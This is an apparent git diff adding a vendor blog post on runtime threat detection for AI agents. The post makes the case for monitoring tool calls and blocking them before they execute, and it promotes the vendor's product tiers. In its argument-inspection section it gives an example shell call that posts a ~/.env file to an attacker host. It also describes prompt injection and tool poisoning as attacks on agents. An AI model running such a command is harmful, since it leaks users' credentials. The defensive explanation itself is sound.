@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<!--
+  Keyword map
+  Primary:   runtime threat detection
+  Secondary: AI agent threat detection, agentic AI monitoring, tool call monitoring, real-time agent security
+  URL:       /blog/runtime-threat-detection-ai-agents/
+  Audience:  Security engineers and developers deploying/operating AI agents in production
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Every tool call is a runtime event. Static analysis can't see it coming. Here's what runtime threat detection actually means for AI agents — and why it's the minimum bar for production." />
+  <meta name="color-scheme" content="dark" />
+  <!-- Social card -->
+  <meta property="og:title" content="Runtime Threat Detection for AI Agents — Shoofly" />
+  <meta property="og:description" content="Every tool call is a runtime event. Static analysis can't see it coming. Here's what runtime threat detection actually means for AI agents — and why it's the minimum bar for production." />
+  <meta property="og:image" content="https://shoofly.dev/social-card.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://shoofly.dev/blog/runtime-threat-detection-ai-agents/" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Runtime Threat Detection for AI Agents — Shoofly" />
+  <meta name="twitter:description" content="Every tool call is a runtime event. Static analysis can't see it coming. Here's what runtime threat detection actually means for AI agents — and why it's the minimum bar for production." />
+  <meta name="twitter:image" content="https://shoofly.dev/social-card.png" />
+  <title>Runtime Threat Detection for AI Agents — Shoofly</title>
+  <link rel="canonical" href="https://shoofly.dev/blog/runtime-threat-detection-ai-agents/" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="shortcut icon" href="/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #0d1117;
+      --bg-alt: #161b22;
+      --bg-card: #161b22;
+      --border: #30363d;
+      --text: #e6edf3;
+      --text-muted: #8b949e;
+      --accent: #16a34a;
+      --accent-dim: #16a34a33;
+      --font-body: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      --font-mono: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      font-family: var(--font-body);
+      font-size: 1rem;
+      line-height: 1.7;
+      -webkit-font-smoothing: antialiased;
+      padding-top: 56px;
+    }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .site-nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      background-color: var(--bg-alt);
+      border-bottom: 1px solid var(--border);
+      height: 56px; padding: 0 1.5rem;
+      display: flex; justify-content: space-between; align-items: center;
+    }
+    .nav-logo { font-size: 1.1rem; font-weight: 700; color: var(--accent); text-decoration: none; letter-spacing: -0.01em; white-space: nowrap; }
+    .nav-logo:hover { text-decoration: none; }
+    .nav-hamburger { display: none; flex-direction: column; justify-content: space-between; width: 24px; height: 18px; background: none; border: none; cursor: pointer; padding: 0; }
+    .nav-hamburger span { display: block; height: 2px; background: var(--text); border-radius: 2px; }
+    .nav-links { display: flex; list-style: none; gap: 1.5rem; align-items: center; }
+    .nav-links a { font-size: 0.9rem; font-weight: 500; color: var(--text-muted); text-decoration: none; transition: color 0.15s; }
+    .nav-links a:hover { color: var(--text); }
+    @media (max-width: 768px) {
+      .nav-hamburger { display: flex; }
+      .nav-links { display: none; position: absolute; top: 56px; left: 0; right: 0; background: var(--bg-alt); border-bottom: 1px solid var(--border); flex-direction: column; padding: 1rem 1.5rem; gap: 1rem; }
+      .nav-links.open { display: flex; }
+    }
+    .container { width: 100%; max-width: 720px; margin: 0 auto; padding: 0 1.5rem; }
+    .post-header { padding: 3.5rem 0 2rem; border-bottom: 1px solid var(--border); }
+    .post-meta { display: flex; gap: 1rem; align-items: center; margin-bottom: 1rem; }
+    .post-date { font-size: 0.85rem; color: var(--text-muted); }
+    .post-tag { background: var(--accent-dim); color: var(--accent); padding: 0.15rem 0.5rem; border-radius: 4px; font-size: 0.75rem; font-weight: 500; }
+    .post-header h1 { font-size: clamp(1.75rem, 5vw, 2.5rem); font-weight: 700; letter-spacing: -0.02em; line-height: 1.2; }
+    .post-body { padding: 2.5rem 0 4rem; }
+    .post-body p { margin-bottom: 1.4rem; color: var(--text); font-size: 1.05rem; }
+    .post-body h2 { font-size: 1.3rem; font-weight: 700; margin: 2.5rem 0 1rem; color: var(--text); letter-spacing: -0.01em; }
+    .post-body code { font-family: var(--font-mono); font-size: 0.88em; background: var(--bg-alt); border: 1px solid var(--border); padding: 0.15em 0.4em; border-radius: 3px; }
+    .post-body pre { background: var(--bg-alt); border: 1px solid var(--border); border-radius: 6px; padding: 1.25rem 1.5rem; margin: 1.5rem 0; overflow-x: auto; }
+    .post-body pre code { background: none; border: none; padding: 0; font-size: 0.9rem; }
+    .post-body hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
+    .post-body strong { color: var(--text); font-weight: 600; }
+    .post-body a { color: var(--accent); font-weight: 600; text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .post-body strong a, .post-body a strong { color: var(--accent); }
+    .back-link { display: inline-block; margin-bottom: 2rem; font-size: 0.9rem; color: var(--text-muted); }
+    .back-link:hover { color: var(--accent); }
+    .footer { border-top: 1px solid var(--border); padding: 2rem 0; margin-top: 2rem; }
+    .footer-inner { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 1rem; }
+    .footer-copy { color: var(--text-muted); font-size: 0.875rem; }
+    .footer-link { font-size: 0.875rem; color: var(--text-muted); text-decoration: none; }
+    .footer-link:hover { color: var(--accent); }
+    .footer-links { display: flex; gap: 1.5rem; flex-wrap: wrap; }
+  </style>
+</head>
+<body>
+  <nav class='site-nav'>
+    <a href='/' class='nav-logo'>🪰 Shoofly</a>
+    <button class='nav-hamburger' id='navHamburger' aria-label='Open menu'>
+      <span></span><span></span><span></span>
+    </button>
+    <ul class='nav-links' id='navLinks'>
+      <li><a href='/#pricing'>Shoofly Basic</a></li>
+      <li><a href='/#pricing-advanced'>Shoofly Advanced</a></li>
+      <li><a href='/claude-code-dispatch'>Claude Code FAQs</a></li>
+      <li><a href='/openclaw'>OpenClaw FAQs</a></li>
+      <li><a href='/blog'>Blog</a></li>
+      <li><a href='https://clawhub.ai/wow-leeroy-jenkins05/shoofly-basic' target='_blank' rel='noopener'>ClawHub</a></li>
+      <li><a href='https://github.com/shoofly-dev/shoofly' target='_blank' rel='noopener'>GitHub</a></li>
+    </ul>
+  </nav>
+
+  <div class="container">
+    <div class="post-header">
+      <div class="post-meta">
+        <time class="post-date" datetime="2026-03-29">March 29, 2026</time>
+        <span class="post-tag">Security</span>
+      </div>
+      <h1>Runtime Threat Detection for AI Agents</h1>
+    </div>
+
+    <main class="post-body">
+      <a href="/blog" class="back-link">← Back to Blog</a>
+
+      <p>
+        When developers talk about securing AI agents, they often reach for familiar concepts:
+        input validation, output filtering, audit logging. These tools come from the web application
+        security playbook, and they're well-understood. The problem is that AI agents don't follow
+        the same rules as web apps. The threat surface is different. The attack timing is different.
+        And the security layer that actually matters — <strong>runtime threat detection</strong> —
+        is one most teams haven't thought carefully about yet.
+      </p>
+
+      <p>
+        This post lays out what runtime means in the context of agentic systems, why static analysis
+        falls short, and what good <strong>AI agent threat detection</strong> looks like in practice.
+      </p>
+
+      <h2>What "Runtime" Actually Means for AI Agents</h2>
+
+      <p>
+        In traditional software security, "runtime" usually refers to the execution environment —
+        the JVM, the Node process, whatever's running your code. Runtime protection means watching
+        that environment for anomalies: memory exploits, process injection, unexpected syscalls.
+      </p>
+
+      <p>
+        For AI agents, runtime has a sharper definition. An agent operates in a loop: it receives
+        context, reasons over it, selects a tool, and fires a call with arguments. That sequence —
+        model output → tool invocation → execution — is the agent runtime. Every meaningful action
+        an agent takes passes through this loop. Every tool call is a runtime event.
+      </p>
+
+      <p>
+        And here's the key thing: <strong>there is no static equivalent to a tool call.</strong>
+        You can inspect an agent's code before it runs. You can audit the list of tools it has
+        access to. You can review its system prompt. None of that tells you what the agent will
+        actually do when it encounters a live document, a live API response, or a live instruction
+        injected into its context at execution time. The behavior is determined at runtime,
+        and it can only be observed at runtime.
+      </p>
+
+      <h2>Three Layers of Agent Security: Static Analysis, Runtime Detection, Pre-Execution Blocking</h2>
+
+      <p>
+        Most <a href="/ai-agent-security/">security tools in the agentic AI space</a> operate at one of three layers.
+        Understanding the difference matters when you're deciding how much protection you actually have.
+      </p>
+
+      <p>
+        <strong>Static analysis</strong> examines agent configuration, tool definitions, and code before
+        anything runs. It's useful for catching misconfigurations — tools with overly broad permissions,
+        prompts that expose sensitive instructions, dependency issues. But static analysis is fundamentally
+        blind to runtime-injected threats. A <a href="/blog/mcp-tool-poisoning-what-it-is-and-how-to-stop-it/">poisoned MCP tool response</a>,
+        a prompt injection embedded in a webpage the agent summarizes, a dynamically loaded skill
+        with malicious instructions — none of these exist at static analysis time. They only exist
+        when the agent is running and processing live data. Static analysis gives you a clean bill
+        of health for the agent you configured, not the agent you deployed into a live environment.
+      </p>
+
+      <p>
+        <strong>Runtime detection</strong> watches what the agent does as it does it — logging tool calls,
+        inspecting arguments, surfacing anomalies — this is the core of <strong>AI agent threat detection</strong>. This is the layer where <strong>agentic AI monitoring</strong>
+        lives. It's a meaningful improvement over static analysis because it can observe behavior
+        that only materializes at execution time. It can catch patterns: an agent that never sends
+        outbound requests suddenly trying to exfiltrate data, or a tool being called with arguments
+        that look nothing like normal usage. Detection at this layer gives you visibility. What it
+        doesn't give you is prevention. By the time you've detected the anomaly, the tool call has
+        already fired.
+      </p>
+
+      <p>
+        <strong>Pre-execution blocking</strong> is the third layer — and the one that actually stops damage.
+        Rather than observing what happened, it intercepts the tool call synchronously before it executes.
+        The policy evaluation happens at the hook layer, between the model's decision and the runtime's
+        execution. If the call violates policy, it never fires. This is <a href="/agentic-ai-security/">the architecture</a>
+        that makes prevention possible rather than just faster incident response.
+      </p>
+
+      <h2>Why Runtime Is the Minimum Bar for Agentic Systems</h2>
+
+      <p>
+        Static analysis is a useful baseline, but it's not enough on its own — and in agentic systems,
+        relying on it as your primary security layer is a meaningful risk.
+      </p>
+
+      <p>
+        The threat vectors that matter most for agents are all runtime phenomena. Prompt injection
+        doesn't live in your agent's code; it lives in the documents, web pages, and API responses
+        your agent processes at execution time. <a href="/blog/mcp-tool-poisoning-what-it-is-and-how-to-stop-it/">MCP tool poisoning</a>
+        works by delivering malicious instructions through a tool's response at runtime — the tool
+        definition looks clean at static analysis time. Dynamically loaded skills or plugins may not
+        even exist when you do your pre-deployment audit. The attack surface for agentic systems
+        is fundamentally a runtime surface.
+      </p>
+
+      <p>
+        This is why <strong>real-time agent security</strong> isn't a nice-to-have; it's the baseline.
+        If you're running AI agents in production without runtime monitoring, you're flying blind.
+        You won't know what your agent did with a malicious instruction until after the fact —
+        if you find out at all. Production-grade agentic systems need runtime coverage as the
+        minimum requirement, with pre-execution blocking as the target.
+      </p>
+
+      <p>
+        There's also an operational dimension. Agents operating on production systems — reading files,
+        running commands, making API calls — can cause irreversible damage. Deleted files, exfiltrated
+        credentials, corrupted databases. Detection after the fact means your incident report is
+        detailed. It doesn't mean your data is safe. <a href="/blog/why-we-block-instead-of-detect/">The case for blocking over detection</a>
+        comes down to this: the only damage you can truly prevent is damage that never happens.
+      </p>
+
+      <h2>What Good Tool Call Monitoring Looks Like</h2>
+
+      <p>
+        <strong>Tool call monitoring</strong> is the practical implementation of runtime detection for agents.
+        Every tool call has three observable properties: the tool name, the arguments passed, and
+        the context in which the call was made. Good monitoring captures all three and evaluates
+        them against a coherent threat model.
+      </p>
+
+      <p>
+        Concretely, that means:
+      </p>
+
+      <p>
+        <strong>Tool-level visibility.</strong> You need to know which tools fired, not just that
+        the agent ran. "Agent completed task" is not useful security telemetry. "Agent called
+        <code>write_file</code> with path <code>/etc/hosts</code> and content containing a redirect"
+        is. Good monitoring is granular at the tool call level.
+      </p>
+
+      <p>
+        <strong>Argument inspection.</strong> Tool names alone aren't enough. An agent calling
+        <code>shell_exec</code> with <code>ls -la</code> is very different from one calling it
+        with <code>curl https://attacker.com/exfil -d @~/.env</code>. Monitoring that doesn't
+        inspect arguments is missing most of the signal.
+      </p>
+
+      <p>
+        <strong>Policy-based evaluation.</strong> Raw logs are better than nothing, but effective
+        monitoring evaluates each call against a defined policy. What tools are allowed? What
+        argument patterns are suspicious? What constitutes a violation? Policy-based evaluation
+        turns a stream of events into a stream of verdicts — and those verdicts can drive alerting
+        or, with the right architecture, blocking.
+      </p>
+
+      <p>
+        <strong>Alert fidelity.</strong> Monitoring that generates too many false positives gets
+        ignored. Good tool call monitoring is tuned to the agent's normal behavior, so that when
+        something genuinely anomalous happens, the alert is signal rather than noise.
+      </p>
+
+      <p>
+        For teams wanting a hands-on implementation path, the <a href="/guides/">Shoofly guides</a>
+        walk through setting up runtime monitoring and policy configuration step by step.
+      </p>
+
+      <h2>Shoofly's Approach: From Detection to Blocking</h2>
+
+      <p>
+        Shoofly is built around the premise that detection is necessary but not sufficient.
+        The product is structured as two tiers, each representing a different security posture.
+      </p>
+
+      <p>
+        <strong>Shoofly Basic</strong> is free. It provides runtime detection and alerting —
+        every tool call is monitored, evaluated against a threat policy, and surfaced if it
+        looks suspicious. The threat policy is open and auditable: you can read exactly what
+        rules Shoofly is enforcing and modify them to fit your environment. This is the
+        runtime detection layer. It gives you visibility into what your agents are doing
+        and alerts when something looks wrong.
+      </p>
+
+      <p>
+        <strong>Shoofly Advanced</strong> upgrades detection to full <a href="/agentic-ai-security/">pre-execution blocking</a>.
+        The architecture shifts from observe-and-alert to intercept-and-halt. When a tool call
+        hits the hook layer, it's evaluated synchronously against policy. If it's clean, it fires.
+        If it violates policy, it doesn't — not after a delay, not pending review, but immediately
+        and completely. The call never reaches the runtime. Advanced also adds real-time alerts
+        via Telegram and desktop notifications, and policy linting to help you write rules that
+        work. See <a href="/#pricing">pricing details</a>.
+      </p>
+
+      <p>
+        The distinction matters for your threat model. If your agents have read-only access and
+        the blast radius of a compromise is limited, detection may be sufficient — you get visibility,
+        you can investigate, you can remediate. If your agents can write files, run commands, make
+        API calls, or handle credentials, the window between "threat detected" and "damage done"
+        may be zero. Pre-execution blocking is the only way to close that window. That architecture
+        is <a href="/openclaw-security/">available for OpenClaw-hosted agents</a> today.
+      </p>
+
+      <p>
+        The goal isn't perfect prediction of what an agent might do. It's a gate that evaluates
+        what it's actually about to do — and stops it if the answer is wrong.
+      </p>
+
+      <hr>
+
+      <p><a href="/#pricing">See plans and pricing →</a></p>
+
+      <p>Add runtime security for <a href="/claude-code-dispatch">Claude Code</a> and <a href="/openclaw">OpenClaw</a> agents:</p>
+      <pre><code>curl -fsSL https://shoofly.dev/install.sh | bash</code></pre>
+
+      <hr>
+
+      <p style="font-size:0.9rem; color:var(--text-muted);">
+        <strong style="color:var(--text);">Related reading:</strong>
+        <a href="/agentic-ai-security/">Agentic AI Security</a> ·
+        <a href="/blog/why-we-block-instead-of-detect/">Why We Block Instead of Detect</a> ·
+        <a href="/blog/mcp-tool-poisoning-what-it-is-and-how-to-stop-it/">MCP Tool Poisoning</a> ·
+        <a href="/openclaw-security/">OpenClaw Security</a>
+      </p>
+    </main>
+  </div>
+
+  <footer class="footer">
+    <div class="container footer-inner">
+      <span class="footer-copy">&copy; 2026 Shoofly</span>
+      <div class="footer-links">
+        <a href="https://github.com/shoofly-dev/shoofly" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub</a>
+        <a href="/openclaw" class="footer-link">OpenClaw</a>
+        <a href="/claude-code-dispatch" class="footer-link">Claude Code</a>
+        <a href="/guides" class="footer-link">Guides</a>
+        <a href="/blog" class="footer-link">Blog</a>
+        <a href="/docs/advanced" class="footer-link">Shoofly Advanced Docs</a>
+        <a href="mailto:support@shoofly.dev" class="footer-link">support@shoofly.dev</a>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    const hamburger = document.getElementById('navHamburger');
+    const navLinks = document.getElementById('navLinks');
+    if (hamburger) hamburger.addEventListener('click', () => navLinks.classList.toggle('open'));
+  </script>
+</body>
+</html>
